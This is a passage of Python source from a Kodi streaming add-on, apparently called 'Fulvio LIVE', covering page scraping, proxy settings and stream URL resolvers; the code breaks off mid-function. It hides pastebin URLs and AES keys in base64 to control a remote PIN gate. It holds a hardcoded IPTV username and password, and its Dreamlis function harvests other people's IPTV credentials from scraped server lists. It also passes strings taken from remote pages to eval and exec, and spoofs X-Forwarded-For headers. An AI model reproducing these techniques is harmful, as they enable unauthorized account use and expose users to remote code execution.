                            addon_log("Regex: -- Not a appendcookie")

                        try:
                            regexs[i('name')[0].string]['ignorecache'] = i('ignorecache')[0].string
                        except:
                            addon_log("Regex: -- no ignorecache")
                        #try:
                        #    regexs[i('name')[0].string]['ignorecache'] = i('ignorecache')[0].string
                        #except:
                        #    addon_log("Regex: -- no ignorecache")

                    regexs = urllib.quote(repr(regexs))
                    return regexs
                    #print regexs
                except:
                    regexs = None
                    addon_log('regex Error: '+name.encode('utf-8', 'ignore'))
#copies from lamda's implementation
def get_ustream(url):
    try:
        for i in range(1, 51):
            result = getUrl(url)
            if "EXT-X-STREAM-INF" in result: return url
            if not "EXTM3U" in result: return
            xbmc.sleep(2000)
        return
    except:
        return

def argHome():
    file = os.path.join(profile, 'pincode')
    if not os.path.exists(file):
        write_file(file, '9999')

    f = open(file, 'r')
    data = f.read()
    f.close()

    try:
        h = base64.decodestring('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3BKd1luZExV')
        c = makeRequest(h)
        c = gethome(c,base64.decodestring('YlZjVTJQdmM2NHJZenpFZA=='))
        m = re.findall(base64.decodestring('PHBpbj4oLio/KTxwaW4+'), c)[0]
        # h = base64.decodestring('aHR0cHM6Ly9pcHR2c2hhcmUucHcvaS5waHA=')
        # c = makeRequest(h)
        # m = re.findall(base64.decodestring('PHBpbj4oLio/KTxwaW4+'), c)[0]
        pp = re.findall('(.+)', data)
        if len(pp) > 0:
            p = pp[0]
        else:
            p = numeric(base64.decodestring('RnVsdmlvIExJVkU6IEluc2VyaXNjaSBQSU4='), '')
            f = open(file, 'w')
            f.write(p)
            f.close()
        if m != 'closed' and m != 'disabled':
            if int(p) == int(m):
                return m
            else:
                p = numeric(base64.decodestring('RnVsdmlvIExJVkU6IEluc2VyaXNjaSBQSU4='), '')
                f = open(file, 'w')
                f.write(p)
                f.close()
                if int(p) == int(m):
                    return m
                else:
                    xbmcgui.Dialog().ok(base64.decodestring('RnVsdmlvIExJVkU='), base64.decodestring('UElOIEVycmF0bzo=')+' [COLOR red]'+str(p)+'[/COLOR]', '', '')
        elif m == 'disabled':
            return m
        elif m == 'closed':
            xbmcgui.Dialog().ok(base64.decodestring('RnVsdmlvIExJVkU='), base64.decodestring('W0NPTE9SIHJlZF1TRVpJT05FIENISVVTQVsvQ09MT1Jd'), '', '')
            pass
    except:
        h = base64.decodestring('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3BKd1luZExV')
        c = makeRequest(h)
        c = gethome(c,base64.decodestring('YlZjVTJQdmM2NHJZenpFZA=='))
        m = re.findall(base64.decodestring('PHBpbj4oLio/KTxwaW4+'), c)[0]
        pp = re.findall('(.+)', data)
        if len(pp) > 0:
            p = pp[0]
        else:
            p = numeric(base64.decodestring('RnVsdmlvIExJVkU6IEluc2VyaXNjaSBQSU4='), '')
            f = open(file, 'w')
            f.write(p)
            f.close()
        if m != 'closed' and m != 'disabled':
            if int(p) == int(m):
                return m
            else:
                p = numeric(base64.decodestring('RnVsdmlvIExJVkU6IEluc2VyaXNjaSBQSU4='), '')
                f = open(file, 'w')
                f.write(p)
                f.close()
                if int(p) == int(m):
                    return m
                else:
                    xbmcgui.Dialog().ok(base64.decodestring('RnVsdmlvIExJVkU='), base64.decodestring('UElOIEVycmF0bzo=')+' [COLOR red]'+str(p)+'[/COLOR]', '', '')
        elif m == 'disabled':
            return m
        elif m == 'closed':
            xbmcgui.Dialog().ok(base64.decodestring('RnVsdmlvIExJVkU='), base64.decodestring('W0NPTE9SIHJlZF1TRVpJT05FIENISVVTQVsvQ09MT1Jd'), '', '')
            pass
        
        # xbmcgui.Dialog().ok(base64.decodestring('RnVsdmlvIExJVkU='), base64.decodestring('SWwgUElOIHBlciBxdWVzdGEgdm9sdGEgw6g6IFtDT0xPUiB5ZWxsb3ddMDAwMFsvQ09MT1Jd'), '', '')
        # p = numeric(base64.decodestring('RnVsdmlvIExJVkU6IEluc2VyaXNjaSBQSU4='), '')
        # if int(p) == int(m):
            # return m

def getRegexParsed(regexs, url,cookieJar=None,forCookieJarOnly=False,recursiveCall=False,cachedPages={}, rawPost=False, cookie_jar_file=None):#0,1,2 = URL, regexOnly, CookieJarOnly
        if not recursiveCall:
            regexs = eval(urllib.unquote(regexs))
        #cachedPages = {}
        #print 'url',url
        doRegexs = re.compile('\$doregex\[([^\]]*)\]').findall(url)
#        print 'doRegexs',doRegexs,regexs
        setresolved=True
        for k in doRegexs:
            if k in regexs:
                #print 'processing ' ,k
                m = regexs[k]
                #print m
                cookieJarParam=False
                if  'cookiejar' in m: # so either create or reuse existing jar
                    #print 'cookiejar exists',m['cookiejar']
                    cookieJarParam=m['cookiejar']
                    if  '$doregex' in cookieJarParam:
                        cookieJar=getRegexParsed(regexs, m['cookiejar'],cookieJar,True, True,cachedPages)
                        
                        cookieJarParam=True
                    else:
                        cookieJarParam=True
                #print 'm[cookiejar]',m['cookiejar'],cookieJar
                if cookieJarParam:
                    if cookieJar==None:
                        #print 'create cookie jar'
                        cookie_jar_file=None
                        if 'open[' in m['cookiejar']:
                            cookie_jar_file=m['cookiejar'].split('open[')[1].split(']')[0]
#                            print 'cookieJar from file name',cookie_jar_file

                        cookieJar=getCookieJar(cookie_jar_file)
#                        print 'cookieJar from file',cookieJar
                        if cookie_jar_file:
                            saveCookieJar(cookieJar,cookie_jar_file)
                        #import cookielib
                        #cookieJar = cookielib.LWPCookieJar()
                        #print 'cookieJar new',cookieJar
                    elif 'save[' in m['cookiejar']:
                        cookie_jar_file=m['cookiejar'].split('save[')[1].split(']')[0]
                        complete_path=os.path.join(profile,cookie_jar_file)
#                        print 'complete_path',complete_path
                        saveCookieJar(cookieJar,cookie_jar_file)
                if  m['page'] and '$doregex' in m['page']:
                    pg=getRegexParsed(regexs, m['page'],cookieJar,recursiveCall=True,cachedPages=cachedPages)
                    if len(pg)==0:
                        pg='http://regexfailed'
                    m['page']=pg

                if 'setcookie' in m and m['setcookie'] and '$doregex' in m['setcookie']:
                    m['setcookie']=getRegexParsed(regexs, m['setcookie'],cookieJar,recursiveCall=True,cachedPages=cachedPages)
                if 'appendcookie' in m and m['appendcookie'] and '$doregex' in m['appendcookie']:
                    m['appendcookie']=getRegexParsed(regexs, m['appendcookie'],cookieJar,recursiveCall=True,cachedPages=cachedPages)


                if  'post' in m and '$doregex' in m['post']:
                    m['post']=getRegexParsed(regexs, m['post'],cookieJar,recursiveCall=True,cachedPages=cachedPages)
#                    print 'post is now',m['post']

                if  'rawpost' in m and '$doregex' in m['rawpost']:
                    m['rawpost']=getRegexParsed(regexs, m['rawpost'],cookieJar,recursiveCall=True,cachedPages=cachedPages,rawPost=True)
                    #print 'rawpost is now',m['rawpost']

                if 'rawpost' in m and '$epoctime$' in m['rawpost']:
                    m['rawpost']=m['rawpost'].replace('$epoctime$',getEpocTime())

                if 'rawpost' in m and '$epoctime2$' in m['rawpost']:
                    m['rawpost']=m['rawpost'].replace('$epoctime2$',getEpocTime2())


                link=''
                if m['page'] and m['page'] in cachedPages and not 'ignorecache' in m and forCookieJarOnly==False :
                    #print 'using cache page',m['page']
                    link = cachedPages[m['page']]
                else:
                    if m['page'] and  not m['page']=='' and  m['page'].startswith('http'):
                        if '$epoctime$' in m['page']:
                            m['page']=m['page'].replace('$epoctime$',getEpocTime())
                        if '$epoctime2$' in m['page']:
                            m['page']=m['page'].replace('$epoctime2$',getEpocTime2())

                        #print 'Ingoring Cache',m['page']
                        page_split=m['page'].split('|')
                        pageUrl=page_split[0]
                        header_in_page=None
                        if len(page_split)>1:
                            header_in_page=page_split[1]

#                            if 
#                            proxy = urllib2.ProxyHandler({ ('https' ? proxytouse[:5]=="https":"http") : proxytouse})
#                            opener = urllib2.build_opener(proxy)
#                            urllib2.install_opener(opener)

                            
                        
#                        import urllib2
#                        print 'urllib2.getproxies',urllib2.getproxies()
                        current_proxies=urllib2.ProxyHandler(urllib2.getproxies())
        
        
                        #print 'getting pageUrl',pageUrl
                        req = urllib2.Request(pageUrl)
                        if 'proxy' in m:
                            proxytouse= m['proxy']
#                            print 'proxytouse',proxytouse
#                            urllib2.getproxies= lambda: {}
                            if pageUrl[:5]=="https":
                                proxy = urllib2.ProxyHandler({ 'https' : proxytouse})
                                #req.set_proxy(proxytouse, 'https')
                            else:
                                proxy = urllib2.ProxyHandler({ 'http'  : proxytouse})
                                #req.set_proxy(proxytouse, 'http')
                            opener = urllib2.build_opener(proxy)
                            urllib2.install_opener(opener)
                            
                        
                        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1')
                        proxytouse=None

                        if 'referer' in m:
                            req.add_header('Referer', m['referer'])
                        if 'accept' in m:
                            req.add_header('Accept', m['accept'])
                        if 'agent' in m:
                            req.add_header('User-agent', m['agent'])
                        if 'x-req' in m:
                            req.add_header('X-Requested-With', m['x-req'])
                        if 'x-addr' in m:
                            req.add_header('x-addr', m['x-addr'])
                        if 'x-forward' in m:
                            req.add_header('X-Forwarded-For', m['x-forward'])
                        if 'setcookie' in m:
#                            print 'adding cookie',m['setcookie']
                            req.add_header('Cookie', m['setcookie'])
                        if 'appendcookie' in m:
#                            print 'appending cookie to cookiejar',m['appendcookie']
                            cookiestoApend=m['appendcookie']
                            cookiestoApend=cookiestoApend.split(';')
                            for h in cookiestoApend:
                                n,v=h.split('=')
                                w,n= n.split(':')
                                ck = cookielib.Cookie(version=0, name=n, value=v, port=None, port_specified=False, domain=w, domain_specified=False, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={'HttpOnly': None}, rfc2109=False)
                                cookieJar.set_cookie(ck)
                        if 'origin' in m:
                            req.add_header('Origin', m['origin'])
                        if header_in_page:
                            header_in_page=header_in_page.split('&')
                            for h in header_in_page:
                                if h.split('=')==2:
                                    n,v=h.split('=')
                                else:
                                    vals=h.split('=')
                                    n=vals[0]
                                    v='='.join(vals[1:])
                                #n,v=h.split('=')
                                req.add_header(n,v)
                        
                        if not cookieJar==None:
#                            print 'cookieJarVal',cookieJar
                            cookie_handler = urllib2.HTTPCookieProcessor(cookieJar)
                            opener = urllib2.build_opener(cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
                            opener = urllib2.install_opener(opener)
#                            print 'noredirect','noredirect' in m
                            
                            if 'noredirect' in m:
                                opener = urllib2.build_opener(cookie_handler,NoRedirection, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
                                opener = urllib2.install_opener(opener)
                        elif 'noredirect' in m:
                            opener = urllib2.build_opener(NoRedirection, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
                            opener = urllib2.install_opener(opener)
                            

                        if 'connection' in m:
#                            print '..........................connection//////.',m['connection']
                            from keepalive import HTTPHandler
                            keepalive_handler = HTTPHandler()
                            opener = urllib2.build_opener(keepalive_handler)
                            urllib2.install_opener(opener)


                        #print 'after cookie jar'
                        post=None

                        if 'post' in m:
                            postData=m['post']
                            #if '$LiveStreamRecaptcha' in postData:
                            #    (captcha_challenge,catpcha_word,idfield)=processRecaptcha(m['page'],cookieJar)
                            #    if captcha_challenge:
                            #        postData=postData.replace('$LiveStreamRecaptcha','manual_recaptcha_challenge_field:'+captcha_challenge+',recaptcha_response_field:'+catpcha_word+',id:'+idfield)
                            splitpost=postData.split(',');
                            post={}
                            for p in splitpost:
                                n=p.split(':')[0];
                                v=p.split(':')[1];
                                post[n]=v
                            post = urllib.urlencode(post)

                        if 'rawpost' in m:
                            post=m['rawpost']
                            #if '$LiveStreamRecaptcha' in post:
                            #    (captcha_challenge,catpcha_word,idfield)=processRecaptcha(m['page'],cookieJar)
                            #    if captcha_challenge:
                            #       post=post.replace('$LiveStreamRecaptcha','&manual_recaptcha_challenge_field='+captcha_challenge+'&recaptcha_response_field='+catpcha_word+'&id='+idfield)
                        link=''
                        if pageUrl:
                            if pageUrl.find(base64.decodestring('aXB0dnNoYXJlLnB3'))>0:
                                link = requests.get(pageUrl, headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1'}, verify=False).text.encode("utf-8")
                                link = gethome(link,getancor('name','path'))

                            else:
                                if post:
                                    response = urllib2.urlopen(req,post)
                                else:
                                    response = urllib2.urlopen(req)
                                if response.info().get('Content-Encoding') == 'gzip':
                                    from StringIO import StringIO
                                    import gzip
                                    buf = StringIO( response.read())
                                    f = gzip.GzipFile(fileobj=buf)
                                    link = f.read()
                                else:
                                    link=response.read()
                                

                        
                        
                            if 'proxy' in m and not current_proxies is None:
                                urllib2.install_opener(urllib2.build_opener(current_proxies))
                            
                            link=javascriptUnEscape(link)
                            #print repr(link)
                            #print link This just print whole webpage in LOG
                            if 'includeheaders' in m:
                                #link+=str(response.headers.get('Set-Cookie'))
                                link+='$$HEADERS_START$$:'
                                for b in response.headers:
                                    link+= b+':'+response.headers.get(b)+'\n'
                                link+='$$HEADERS_END$$:'
    #                        print link
                            addon_log(link)
                            addon_log(cookieJar )

                            if not pageUrl.find(base64.decodestring('aXB0dnNoYXJlLnB3'))>0:
                                response.close()
                        else: 
                            pass
                        cachedPages[m['page']] = link
                        #print link
                        #print 'store link for',m['page'],forCookieJarOnly

                        if forCookieJarOnly:
                            return cookieJar# do nothing
                    elif m['page'] and  not m['page'].startswith('http'):
                        if m['page'].startswith('$pyFunction:'):
                            val=doEval(m['page'].split('$pyFunction:')[1],'',cookieJar,m )
                            if forCookieJarOnly:
                                return cookieJar# do nothing
                            link=val
                            link=javascriptUnEscape(link)
                        else:
                            link=m['page']
                if '$pyFunction:playmedia(' in m['expres'] or 'ActivateWindow'  in m['expres']  or '$PLAYERPROXY$=' in url  or  any(x in url for x in g_ignoreSetResolved):
                    setresolved=False
                if  '$doregex' in m['expres']:
                    m['expres']=getRegexParsed(regexs, m['expres'],cookieJar,recursiveCall=True,cachedPages=cachedPages)
                  
                if not m['expres']=='':
                    #print 'doing it ',m['expres']
                    if '$LiveStreamCaptcha' in m['expres']:
                        val=askCaptcha(m,link,cookieJar)
                        #print 'url and val',url,val
                        url = url.replace("$doregex[" + k + "]", val)

                    elif m['expres'].startswith('$pyFunction:') or '#$pyFunction' in m['expres']:
                        #print 'expeeeeeeeeeeeeeeeeeee',m['expres']
                        val=''
                        if m['expres'].startswith('$pyFunction:'):
                            val=doEval(m['expres'].split('$pyFunction:')[1],link,cookieJar,m)
                        else:
                            val=doEvalFunction(m['expres'],link,cookieJar,m)
                        if 'ActivateWindow' in m['expres']: return
                        if forCookieJarOnly:
                            return cookieJar# do nothing
                        if 'listrepeat' in m:
                            listrepeat=m['listrepeat']                            
                            #ret=re.findall(m['expres'],link)
                            #print 'ret',val
                            return listrepeat,eval(val), m,regexs,cookieJar
#                        print 'url k val',url,k,val
                        #print 'repr',repr(val)
                        
                        try:
                            url = url.replace(u"$doregex[" + k + "]", val)
                        except: url = url.replace("$doregex[" + k + "]", val.decode("utf-8"))
                    else:
                        if 'listrepeat' in m:
                            listrepeat=m['listrepeat']
                            #print 'listrepeat',m['expres']
                            #print m['expres']
                            #print 'aaaa'
                            #print link
                            ret=re.findall(m['expres'],link)
                            #print 'ret',ret
                            return listrepeat,ret, m,regexs,cookieJar
                             
                        val=''
                        if not link=='':
                            #print 'link',link
                            reg = re.compile(m['expres']).search(link)                            
                            try:
                                val=reg.group(1).strip()
                            except: traceback.print_exc()
                        elif m['page']=='' or m['page']==None:
                            val=m['expres']
                            
                        if rawPost:
#                            print 'rawpost'
                            val=urllib.quote_plus(val)
                        if 'htmlunescape' in m:
                            #val=urllib.unquote_plus(val)
                            import HTMLParser
                            val=HTMLParser.HTMLParser().unescape(val)
                        try:
                            url = url.replace("$doregex[" + k + "]", val)
                        except: url = url.replace("$doregex[" + k + "]", val.decode("utf-8"))
                        #print 'ur',url
                        #return val
                else:
                    url = url.replace("$doregex[" + k + "]",'')
        if '$epoctime$' in url:
            url=url.replace('$epoctime$',getEpocTime())
        if '$epoctime2$' in url:
            url=url.replace('$epoctime2$',getEpocTime2())

        if '$GUID$' in url:
            import uuid
            url=url.replace('$GUID$',str(uuid.uuid1()).upper())
        if '$get_cookies$' in url:
            url=url.replace('$get_cookies$',getCookiesString(cookieJar))

        if recursiveCall: return url
        #print 'final url',repr(url)
        if url=="":
            return
        else:
            return url,setresolved
def getmd5(t):
    import hashlib
    h=hashlib.md5()
    h.update(t)
    return h.hexdigest()

Tfile2 = os.path.join(addon_data_dir, 'time2.txt')
if os.path.isfile(Tfile2):
        t = time.time() - os.path.getmtime(Tfile2)
        if t > 21600 :
            cdir = os.path.join(xbmc.translatePath("special://temp"),"files")
            if os.path.exists(cdir):
                shutil.rmtree(cdir)
                write_file(Tfile2, '*')
else:
    cdir = os.path.join(xbmc.translatePath("special://temp"),"files") 
    if os.path.exists(cdir):
        shutil.rmtree(cdir)
        write_file(Tfile2, '*')

def decrypt_vaughnlive(encrypted):
    retVal=""
#    print 'enc',encrypted
    #for val in encrypted.split(':'):
    #    retVal+=chr(int(val.replace("0m0","")))
    #return retVal

def Erilis():
    i=[
    'http://------/get.php?username=Abc&password=z6T2qfhmQG&type=m3u'
    ]
    return i

def playmedia(media_url):
    try:
        import  CustomPlayer
        player = CustomPlayer.MyXBMCPlayer()
        listitem = xbmcgui.ListItem( label = str(name), iconImage = "DefaultVideo.png", thumbnailImage = xbmc.getInfoImage( "ListItem.Thumb" ), path=media_url )
        player.play( media_url,listitem)
        xbmc.sleep(1000)
        while player.is_active:
            xbmc.sleep(200)
    except:
        traceback.print_exc()
    return ''

def Dreamlis():
    matches = set()
    out = set()
    c = makeRequest('https://unpent-horns.000webhostapp.com/dreamworl/WEBSERVERS.xml')
    match = re.findall(r'(http.+?(?:=m3u|\.ts))', c)
    for it in match:
        matches.add(it)
    c = makeRequest('https://unpent-horns.000webhostapp.com/dreamworl/PAISES.xml')
    nat = re.findall(r'<page>(https://unpent-horns.000webhostapp.com/dreamworl/[^<]+)</page>', c)
    for i in nat:
        c = makeRequest(i)
        match = re.findall(r'(http.+?(?:=m3u|\.ts))', c)
        for it in match:
            matches.add(it)
    for item in matches:
        if not item.find("get.php?username=")>0:
            ch = re.search("http://(.+?)/live/(.+?)/(.+?)/.+?\.ts",item)
            list = 'http://'+ch.group(1)+'/get.php?username='+ch.group(2)+'&password='+ch.group(3)+'&type=m3u'
            out.add(list)
        else:
            out.add(item)
    return out

def kodiJsonRequest(params):
    data = json.dumps(params)
    request = xbmc.executeJSONRPC(data)

    try:
        response = json.loads(request)
    except UnicodeDecodeError:
        response = json.loads(request.decode('utf-8', 'ignore'))

    try:
        if 'result' in response:
            return response['result']
        return None
    except KeyError:
        logger.warn("[%s] %s" % (params['method'], response['error']['message']))
        return None

def gethome(a,i):
        import pyaes
        i=i.encode("ascii")
        print i
        missingbytes=16-len(i)
        i=i+(chr(0)*(missingbytes))
        print repr(i)
        a=base64.b64decode(a)
        decryptor = pyaes.new(i , pyaes.MODE_ECB, IV=None)
        a=decryptor.decrypt(a).split('\0')[0]
        return a

def setKodiProxy(proxysettings=None):

    if proxysettings==None:
#        print 'proxy set to nothing'
        xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.usehttpproxy", "value":false}, "id":1}')
    else:
        
        ps=proxysettings.split(':')
        proxyURL=ps[0]
        proxyPort=ps[1]
        proxyType=ps[2]
        proxyUsername=None
        proxyPassword=None
        
        if len(ps)>3 and '@' in ps[3]: #jairox ###proxysettings
            proxyUsername=ps[3].split('@')[0] #jairox ###ps[3]
            proxyPassword=ps[3].split('@')[1] #jairox ###proxysettings.split('@')[-1]

#        print 'proxy set to', proxyType, proxyURL,proxyPort
        xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.usehttpproxy", "value":true}, "id":1}')
        xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxytype", "value":' + str(proxyType) +'}, "id":1}')
        xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxyserver", "value":"' + str(proxyURL) +'"}, "id":1}')
        xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxyport", "value":' + str(proxyPort) +'}, "id":1}')
        
        
        if not proxyUsername==None:
            xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxyusername", "value":"' + str(proxyUsername) +'"}, "id":1}')
            xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxypassword", "value":"' + str(proxyPassword) +'"}, "id":1}')

        
def getConfiguredProxy():
    proxyActive = kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.usehttpproxy"}, 'id': 1})['value']
#    print 'proxyActive',proxyActive
    proxyType = kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.httpproxytype"}, 'id': 1})['value']

    if proxyActive: # PROXY_HTTP
        proxyURL = kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.httpproxyserver"}, 'id': 1})['value']
        proxyPort = unicode(kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.httpproxyport"}, 'id': 1})['value'])
        proxyUsername = kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.httpproxyusername"}, 'id': 1})['value']
        proxyPassword = kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.httpproxypassword"}, 'id': 1})['value']

        if proxyUsername and proxyPassword and proxyURL and proxyPort:
            return proxyURL + ':' + str(proxyPort)+':'+str(proxyType) + ':' + proxyUsername + '@' + proxyPassword
        elif proxyURL and proxyPort:
            return proxyURL + ':' + str(proxyPort)+':'+str(proxyType)
    else:
        return None
        
def playmediawithproxy(media_url, name, iconImage,proxyip,port, proxyuser=None, proxypass=None): #jairox

    progress = xbmcgui.DialogProgress()
    progress.create('Progress', 'Playing with custom proxy')
    progress.update( 10, "", "setting proxy..", "" )
    proxyset=False
    existing_proxy=''
    #print 'playmediawithproxy'
    try:
        
        existing_proxy=getConfiguredProxy()
        print 'existing_proxy',existing_proxy
        #read and set here
        #jairox
        if not proxyuser == None:
            setKodiProxy( proxyip + ':' + port + ':0:' + proxyuser + '@' + proxypass)
        else:
            setKodiProxy( proxyip + ':' + port + ':0')

        #print 'proxy setting complete', getConfiguredProxy()
        proxyset=True
        progress.update( 80, "", "setting proxy complete, now playing", "" )
        
        progress.close()
        progress=None
        import  CustomPlayer
        player = CustomPlayer.MyXBMCPlayer()
        listitem = xbmcgui.ListItem( label = str(name), iconImage = iconImage, thumbnailImage = xbmc.getInfoImage( "ListItem.Thumb" ), path=media_url )
        player.play( media_url,listitem)
        xbmc.sleep(1000)
        while player.is_active:
            xbmc.sleep(200)
    except:
        traceback.print_exc()
    if progress:
        progress.close()
    if proxyset:
#        print 'now resetting the proxy back'
        setKodiProxy(existing_proxy)
#        print 'reset here'
    return ''

def Risest():
    # i=[
    # ['null','null','0'],\
    # ]
    h = makeRequest(base64.decodestring('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L05MRWJRUWl4'))
    d = gethome(h,base64.decodestring('WXhaZVFhVXRuWUJmUWhaZA=='))

    i = re.compile("  \['([^']+)','([^']+)','([^']+)'\]").findall(d)
    return i

def saveLes(les):
    import time
    now = str(time.time())
    folder = addon.getSetting("download_path_list")
    file = os.path.join(folder, 'lists-'+now+'.txt')
    f = open(file, 'w')
    for item in les:
        f.write(""+str(item.encode('utf-8'))+"\n")
    f.close()

def get_saw_rtmp(page_value, referer=None):
    if referer:
        referer=[('Referer',referer)]
    if page_value.startswith("http"):
        page_url=page_value
        page_value= getUrl(page_value,headers=referer)

    str_pattern="(eval\(function\(p,a,c,k,e,(?:r|d).*)"

    reg_res=re.compile(str_pattern).findall(page_value)
    r=""
    if reg_res and len(reg_res)>0:
        for v in reg_res:
            r1=get_unpacked(v)
            r2=re_me(r1,'\'(.*?)\'')
            if 'unescape' in r1:
                r1=urllib.unquote(r2)
            r+=r1+'\n'
#        print 'final value is ',r

        page_url=re_me(r,'src="(.*?)"')

        page_value= getUrl(page_url,headers=referer)

    #print page_value

    rtmp=re_me(page_value,'streamer\'.*?\'(.*?)\'\)')
    playpath=re_me(page_value,'file\',\s\'(.*?)\'')


    return rtmp+' playpath='+playpath +' pageUrl='+page_url

def get_source_rtmp(value=None, header=None):
    u = base64.decodestring(value)
    hdrs = {'Referer':'', 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36'}
    for i in range(10):
        try:
            d = requests.get(u, headers=hdrs, verify=False, timeout=10).text
        except:
            pass
    return

def get_leton_rtmp(page_value, referer=None):
    if referer:
        referer=[('Referer',referer)]
    if page_value.startswith("http"):
        page_value= getUrl(page_value,headers=referer)
    str_pattern="var a = (.*?);\s*var b = (.*?);\s*var c = (.*?);\s*var d = (.*?);\s*var f = (.*?);\s*var v_part = '(.*?)';"
    reg_res=re.compile(str_pattern).findall(page_value)[0]

    a,b,c,d,f,v=(reg_res)
    f=int(f)
    a=int(a)/f
    b=int(b)/f
    c=int(c)/f
    d=int(d)/f

    ret= 'rtmp://' + str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d) + v;
    return ret

def createM3uForDash(url,useragent=None):
    str='#EXTM3U'
    str+='\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=361816'
    str+='\n'+url+'&bytes=0-200000'#+'|User-Agent='+useragent
    source_list = os.path.join(profile, 'testfile.m3u')
    str+='\n'
    SaveToFile(source_list,str)
    #return 'C:/Users/shani/Downloads/test.m3u8'
    return source_list

def SaveToFile(file_name,page_data,append=False):
    if append:
        f = open(file_name, 'a')
        f.write(page_data)
        f.close()
    else:
        f=open(file_name,'wb')
        f.write(page_data)
        f.close()
        return ''

def LoadFile(file_name):
    f=open(file_name,'rb')
    d=f.read()
    f.close()
    return d

def get_packed_iphonetv_url(page_data):
    import re,base64,urllib;
    s=page_data
    while 'geh(' in s:
        if s.startswith('lol('): s=s[5:-1]
#       print 's is ',s
        s=re.compile('"(.*?)"').findall(s)[0];
        s=  base64.b64decode(s);
        s=urllib.unquote(s);
    print s
    return s

def get_ferrari_url(page_data):
#    print 'get_dag_url2',page_data
    page_data2=getUrl(page_data);
    patt='(http.*)'
    import uuid
    playback=str(uuid.uuid1()).upper()
    links=re.compile(patt).findall(page_data2)
    headers=[('X-Playback-Session-Id',playback)]
    for l in links:
        try:
                page_datatemp=getUrl(l,headers=headers);

        except: pass

    return page_data+'|&X-Playback-Session-Id='+playback

def get_dag_url(page_data):
#    print 'get_dag_url',page_data
    if page_data.startswith('http://dag.total-stream.net'):
        headers=[('User-Agent','Verismo-BlackUI_(2.4.7.5.8.0.34)')]
        page_data=getUrl(page_data,headers=headers);

    if '127.0.0.1' in page_data:
        return revist_dag(page_data)
    elif re_me(page_data, 'wmsAuthSign%3D([^%&]+)') != '':
        final_url = re_me(page_data, '&ver_t=([^&]+)&') + '?wmsAuthSign=' + re_me(page_data, 'wmsAuthSign%3D([^%&]+)') + '==/mp4:' + re_me(page_data, '\\?y=([^&]+)&')
    else:
        final_url = re_me(page_data, 'href="([^"]+)"[^"]+$')
        if len(final_url)==0:
            final_url=page_data
    final_url = final_url.replace(' ', '%20')
    return final_url

def repest(data):
    lim=lisreq(data)
    for i1, i2 in reversed(lim):
        data = data.replace(i2,i1)
    lis=lisrek(data)
    for i1, i2 in reversed(lis):
        data = data.replace(i2,i1)
    return data

def re_me(data, re_patten):
    match = ''
    m = re.search(re_patten, data)
    if m != None:
        match = m.group(1)
    else:
        match = ''
    return match

def revist_dag(page_data):
    final_url = ''
    if '127.0.0.1' in page_data:
        final_url = re_me(page_data, '&ver_t=([^&]+)&') + ' live=true timeout=15 playpath=' + re_me(page_data, '\\?y=([a-zA-Z0-9-_\\.@]+)')

    if re_me(page_data, 'token=([^&]+)&') != '':
        final_url = final_url + '?token=' + re_me(page_data, 'token=([^&]+)&')
    elif re_me(page_data, 'wmsAuthSign%3D([^%&]+)') != '':
        final_url = re_me(page_data, '&ver_t=([^&]+)&') + '?wmsAuthSign=' + re_me(page_data, 'wmsAuthSign%3D([^%&]+)') + '==/mp4:' + re_me(page_data, '\\?y=([^&]+)&')
    else:
        final_url = re_me(page_data, 'HREF="([^"]+)"')

    if 'dag1.asx' in final_url:
        return get_dag_url(final_url)

    if 'devinlivefs.fplive.net' not in final_url:
        final_url = final_url.replace('devinlive', 'flive')
    if 'permlivefs.fplive.net' not in final_url:
        final_url = final_url.replace('permlive', 'flive')
    return final_url

def get_unwise( str_eval):
    page_value=""
    try:
        ss="w,i,s,e=("+str_eval+')'
        exec (ss)
        page_value=unwise_func(w,i,s,e)
    except: traceback.print_exc(file=sys.stdout)
    #print 'unpacked',page_value
    return page_value

def unwise_func( w, i, s, e):
    lIll = 0;
    ll1I = 0;
    Il1l = 0;
    ll1l = [];
    l1lI = [];
    while True:
        if (lIll < 5):
            l1lI.append(w[lIll])
        elif (lIll < len(w)):
            ll1l.append(w[lIll]);
        lIll+=1;
        if (ll1I < 5):
            l1lI.append(i[ll1I])
        elif (ll1I < len(i)):
            ll1l.append(i[ll1I])
        ll1I+=1;
        if (Il1l < 5):
            l1lI.append(s[Il1l])
        elif (Il1l < len(s)):
